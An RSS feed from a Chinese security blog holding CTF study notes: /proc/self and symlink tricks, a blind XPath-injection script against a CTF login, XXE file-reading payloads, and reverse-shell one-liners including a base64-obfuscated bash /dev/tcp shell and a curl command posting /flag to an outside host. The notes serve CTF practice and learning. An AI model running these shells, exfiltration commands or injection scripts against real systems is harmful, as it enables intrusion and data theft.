<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>other on Alex lan</title>
    <link>http://localhost:1313/docs/network-security/other/</link>
    <description>Recent content in other on Alex lan</description>
    <generator>Hugo</generator>
    <language>en</language>
    <lastBuildDate>Sun, 08 Dec 2024 14:03:24 +0800</lastBuildDate>
    <atom:link href="http://localhost:1313/docs/network-security/other/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>linux 知识点</title>
      <link>http://localhost:1313/docs/network-security/other/linux/</link>
      <pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate>
      <guid>http://localhost:1313/docs/network-security/other/linux/</guid>
      <description>&lt;h2 id=&#34;软连接&#34;&gt;&#xD;&#xA;  软连接&#xD;&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#%e8%bd%af%e8%bf%9e%e6%8e%a5&#34;&gt;#&lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&#xD;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;在 linux 中，/proc/self/cwd/会指向进程的当前目录，在不知道 flask 工作目录时，我们可以用/proc/self/cwd/flag/flag.jpg来访问 flag.jpg。&lt;/li&gt;&#xA;&lt;li&gt;ln -s是Linux的软连接命令,其类似与windows的快捷方式。比如ln -s /etc/passwd shawroot 这会出现一个名为shawroot的文件,其内容为/etc/passwd的内容。&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ln -s /proc/self/cwd/flag/flag.jpg shaw&#xA;zip -ry root.zip shaw&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;-r：将指定的目录下的所有子目录以及文件一起处理&#xA;&#xA;-y：直接保存符号连接，而非该连接所指向的文件，本参数仅在UNIX之类的系统下有效。&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;procself&#34;&gt;&#xD;&#xA;  /proc/self&#xD;&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#procself&#34;&gt;#&lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&#xD;&#xA;&lt;p&gt;proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。&lt;/p&gt;&#xA;&lt;p&gt;还有的是一些以数字命名的目录，他们是进程目录，系统中当前运行的每一个进程都有对应的一个目录在/proc下，以进程的PID号为目录名，他们是读取进程信息的接口&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;cmdline&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;cmdline 文件存储着启动当前进程的完整命令&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cat /proc/1083/cmdline&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;cwd&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;cwd 文件是一个指向当前进程运行目录的符号链接。可以通过查看cwd文件获取目标指定进程环境的运行目录&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ls -al /proc/1083/cwd&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;exe 是一个指向启动当前进程的可执行文件（完整路径）的符号链接。通过exe文件我们可以获得指定进程的可执行文件的完整路径&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ls -al /proc/1090/exe&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;environ&lt;/p&gt;&#xA;&lt;p&gt;environ文件存储着当前进程的环境变量列表，通过查看environ目录来获取指定进程的环境变量信息&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cat /proc/2889/environ&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;fd&lt;/p&gt;&#xA;&lt;p&gt;里面包含着当前进程打开的每一个文件的描述符(路径)&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ls -al /proc/1083/fd /proc/self表示当前进程目录&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;/proc/self表示当前进程目录，在过滤了很多字符时就用，比如目录穿越，任意文件等&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/proc/self&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;</description>
    </item>
    <item>
      <title>xpath 注入</title>
      <link>http://localhost:1313/docs/network-security/other/xpath%E6%B3%A8%E5%85%A5/</link>
      <pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate>
      <guid>http://localhost:1313/docs/network-security/other/xpath%E6%B3%A8%E5%85%A5/</guid>
      <description>&lt;p&gt;详见&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/7791#toc-6&#34;&gt;XPATH注入学习 - 先知社区 (aliyun.com)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;import requests&#xA;import re&#xA;import time&#xA;&#xA;s = requests.session()&#xA;url =&amp;#39;http://400f158d-53cf-4163-82a9-0d5ca129fab9.node4.buuoj.cn:81/login.php&amp;#39;&#xA;&#xA;&#xA;&#xA;head ={&#xA;    &amp;#34;User-Agent&amp;#34;: &amp;#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36&amp;#34;,&#xA;    &amp;#34;Content-Type&amp;#34;: &amp;#34;application/xml&amp;#34;&#xA;}&#xA;find =re.compile(&amp;#39;&amp;lt;input type=&amp;#34;hidden&amp;#34; id=&amp;#34;token&amp;#34; value=&amp;#34;(.*?)&amp;#34; /&amp;gt;&amp;#39;)&#xA;&#xA;strs =&amp;#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&amp;#39;&#xA;&#xA;&#xA;flag =&amp;#39;&amp;#39;&#xA;for i in range(1,100):&#xA;    for j in strs:&#xA;        time.sleep(0.2)&#xA;        r = s.post(url=url)&#xA;        token = find.findall(r.text)&#xA;        #猜测根节点名称&#xA;        payload_1 = &amp;#34;&amp;lt;username&amp;gt;&amp;#39;or substring(name(/*[1]), {}, 1)=&amp;#39;{}&amp;#39;  or &amp;#39;&amp;#39;=&amp;#39;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;3123&amp;lt;/password&amp;gt;&amp;lt;token&amp;gt;{}&amp;lt;/token&amp;gt;&amp;#34;.format(i,j,token[0])&#xA;        #猜测子节点名称&#xA;        payload_2 = &amp;#34;&amp;lt;username&amp;gt;&amp;#39;or substring(name(/root/*[1]), {}, 1)=&amp;#39;{}&amp;#39;  or &amp;#39;&amp;#39;=&amp;#39;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;3123&amp;lt;/password&amp;gt;&amp;lt;token&amp;gt;{}&amp;lt;/token&amp;gt;&amp;#34;.format(i,j,token[0])&#xA;&#xA;        #猜测accounts的节点&#xA;        payload_3 =&amp;#34;&amp;lt;username&amp;gt;&amp;#39;or substring(name(/root/accounts/*[1]), {}, 1)=&amp;#39;{}&amp;#39;  or &amp;#39;&amp;#39;=&amp;#39;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;3123&amp;lt;/password&amp;gt;&amp;lt;token&amp;gt;{}&amp;lt;/token&amp;gt;&amp;#34;.format(i,j,token[0])&#xA;&#xA;        #猜测user节点&#xA;        payload_4 =&amp;#34;&amp;lt;username&amp;gt;&amp;#39;or substring(name(/root/accounts/user/*[2]), {}, 1)=&amp;#39;{}&amp;#39;  or &amp;#39;&amp;#39;=&amp;#39;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;3123&amp;lt;/password&amp;gt;&amp;lt;token&amp;gt;{}&amp;lt;/token&amp;gt;&amp;#34;.format(i,j,token[0])&#xA;&#xA;        #跑用户名和密码&#xA;        payload_username =&amp;#34;&amp;lt;username&amp;gt;&amp;#39;or substring(/root/accounts/user[2]/username/text(), {}, 1)=&amp;#39;{}&amp;#39;  or &amp;#39;&amp;#39;=&amp;#39;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;3123&amp;lt;/password&amp;gt;&amp;lt;token&amp;gt;{}&amp;lt;/token&amp;gt;&amp;#34;.format(i,j,token[0])&#xA;&#xA;        payload_password =&amp;#34;&amp;lt;username&amp;gt;&amp;#39;or substring(/root/accounts/user[2]/password/text(), {}, 1)=&amp;#39;{}&amp;#39;  or &amp;#39;&amp;#39;=&amp;#39;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;3123&amp;lt;/password&amp;gt;&amp;lt;token&amp;gt;{}&amp;lt;/token&amp;gt;&amp;#34;.format(i,j,token[0])&#xA;&#xA;&#xA;        print(payload_username)&#xA;        r = s.post(url=url,headers=head,data=payload_password)&#xA;        print(r.text)&#xA;&#xA;&#xA;        if &amp;#34;非法操作&amp;#34; in r.text:&#xA;            flag+=j&#xA;            print(flag)&#xA;            break&#xA;&#xA;    if &amp;#34;用户名或密码错误!&amp;#34; in r.text:&#xA;        break&#xA;&#xA;print(flag)&#xA;&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>XXE</title>
      <link>http://localhost:1313/docs/network-security/other/xxe/</link>
      <pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate>
      <guid>http://localhost:1313/docs/network-security/other/xxe/</guid>
      <description>&lt;p&gt;XXE(XML External Entity attack)XML外部实体注入攻击&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?xml version=&amp;#39;1.0&amp;#39;?&amp;gt; &#xA;&amp;lt;!DOCTYPE x [&#xA;    &amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///flag&amp;#34;&amp;gt;&#xA;]&amp;gt;&#xA; &amp;lt;root&amp;gt;&#xA; &amp;lt;username&amp;gt;&#xA; admin//或者&amp;amp;xxe;&#xA; &amp;lt;/username&amp;gt;&#xA; &amp;lt;password&amp;gt;123&amp;lt;/password&amp;gt;&#xA; &amp;lt;/root&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;&amp;amp;xxe;&lt;/code&gt;会输出文件中的内容&lt;/p&gt;&#xA;&lt;p&gt;在上传xml文件时，utf8不行可以用utf16&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;iconv -f utf8 -t utf-16 1.xml&amp;gt;2.xml&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;svg中的xxe&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&#xA;&amp;lt;!DOCTYPE note [&#xA;&amp;lt;!ENTITY file SYSTEM &amp;#34;file:///proc/self/cwd/flag.txt&amp;#34; &amp;gt;&#xA;]&amp;gt;&#xA;&amp;lt;svg height=&amp;#34;100&amp;#34; width=&amp;#34;1000&amp;#34;&amp;gt;&#xA;  &amp;lt;text x=&amp;#34;10&amp;#34; y=&amp;#34;20&amp;#34;&amp;gt;&amp;amp;file;&amp;lt;/text&amp;gt;&#xA;&amp;lt;/svg&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;svg中也可以写js，xss&lt;/p&gt;</description>
    </item>
    <item>
      <title>反弹shell</title>
      <link>http://localhost:1313/docs/network-security/other/%E5%8F%8D%E5%BC%B9shll/</link>
      <pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate>
      <guid>http://localhost:1313/docs/network-security/other/%E5%8F%8D%E5%BC%B9shll/</guid>
      <description>&lt;h2 id=&#34;正向链接&#34;&gt;&#xD;&#xA;  正向链接&#xD;&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#%e6%ad%a3%e5%90%91%e9%93%be%e6%8e%a5&#34;&gt;#&lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&#xD;&#xA;&lt;p&gt;攻击者连接目标机器，如远程桌面，web服务，ssh等&lt;/p&gt;&#xA;&lt;h2 id=&#34;反向连接&#34;&gt;&#xD;&#xA;  反向连接&#xD;&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#%e5%8f%8d%e5%90%91%e8%bf%9e%e6%8e%a5&#34;&gt;#&lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&#xD;&#xA;&lt;p&gt;相当于角色反转，让目标机器来找我们，为什么要这样做呢&lt;/p&gt;&#xA;&lt;p&gt;常见于命令不回显，受限于防火墙等&lt;/p&gt;&#xA;&lt;p&gt;反弹shell,让目标机器来找我们，就得要有一个公网ip&lt;/p&gt;&#xA;&lt;p&gt;我们用ngrok.cc送的，可以免费用一个公网端口&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;./sunny clientid 204616381952&#xA;&#xA;&#xA;free.idcfengye.com:10189&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;本地映射1234d端口，监听&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;nc -lvp 1234&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;常见的方式&#34;&gt;&#xD;&#xA;  常见的方式&#xD;&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#%e5%b8%b8%e8%a7%81%e7%9a%84%e6%96%b9%e5%bc%8f&#34;&gt;#&lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&#xD;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1&#xA;&#xA;or&#xA;&#xA;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1&amp;#34;#更稳定&#xA;&#xA;or&#xA;&#xA;echo &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.0.112/1234 0&amp;gt;&amp;amp;1&amp;#34; | bash&#xA;&#xA;or&#xA;&#xA;bash -i &amp;gt;&amp;amp; /dev/tcp/111.111.111.111/7015 0&amp;gt;&amp;amp;1&#xA;#对上面进行base64编码=&amp;gt;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTEuMTExLjExMS4xMTEvNzAxNSAwPiYx&#xA;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTEuMTExLjExMS4xMTEvNzAxNSAwPiYx}|{base64,-d}|{bash,-i}&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;解释&lt;/p&gt;&#xA;&lt;table&gt;&#xA;  &lt;thead&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;th&gt;命令&lt;/th&gt;&#xA;          &lt;th&gt;详解&lt;/th&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/thead&gt;&#xA;  &lt;tbody&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;bash -i&lt;/td&gt;&#xA;          &lt;td&gt;产生一个bash交互环境&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&amp;gt;&amp;amp;&lt;/td&gt;&#xA;          &lt;td&gt;将联合符号前面的内容与后面相结合，然后一起重定向给后者。这样在被攻击机上就不会显示执行的命令&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;/dev/tcp/47.xxx.xxx.72/2333&lt;/td&gt;&#xA;          &lt;td&gt;Linux环境中所有的内容都是以文件的形式存在的，就是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;0&amp;gt;&amp;amp;1&lt;/td&gt;&#xA;          &lt;td&gt;将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/tbody&gt;&#xA;&lt;/table&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;curl http://vps:7015 -d @/flag&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;-d参数时post&lt;/p&gt;&#xA;&lt;p&gt;@后面时这个文件&lt;/p&gt;</description>
    </item>
    <item>
      <title>常见端口</title>
      <link>http://localhost:1313/docs/network-security/other/%E7%AB%AF%E5%8F%A3/</link>
      <pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate>
      <guid>http://localhost:1313/docs/network-security/other/%E7%AB%AF%E5%8F%A3/</guid>
      <description>&lt;p&gt;常见端口&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;21&#xA;22&#xA;23&#xA;3389&#xA;5900&#xA;5632&#xA;69&#xA;139&#xA;389&#xA;2094&#xA;53&#xA;6768&#xA;80&#xA;443&#xA;25&#xA;110&#xA;143&#xA;161&#xA;1433&#xA;1521&#xA;3306&#xA;5000&#xA;5432&#xA;6379&#xA;9200&#xA;270117&#xA;22122&#xA;81&#xA;8080&#xA;9080&#xA;9081&#xA;9090&#xA;3700&#xA;4848&#xA;83&#xA;84&#xA;85&#xA;86&#xA;87&#xA;88&#xA;161&#xA;389&#xA;445&#xA;512&#xA;513&#xA;514&#xA;873&#xA;1025&#xA;1433&#xA;1521&#xA;2082&#xA;2083&#xA;2222&#xA;2601&#xA;2604&#xA;3128&#xA;3306&#xA;3312&#xA;3311&#xA;3389&#xA;4440&#xA;4848&#xA;5984&#xA;6082&#xA;6379&#xA;7001&#xA;7002&#xA;7778&#xA;8083&#xA;8649&#xA;8888&#xA;9000&#xA;9200&#xA;9300&#xA;10000&#xA;11211&#xA;27017&#xA;27018&#xA;28017&#xA;50000&#xA;50070&#xA;50060&#xA;50030&#xA;&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
  </channel>
</rss>
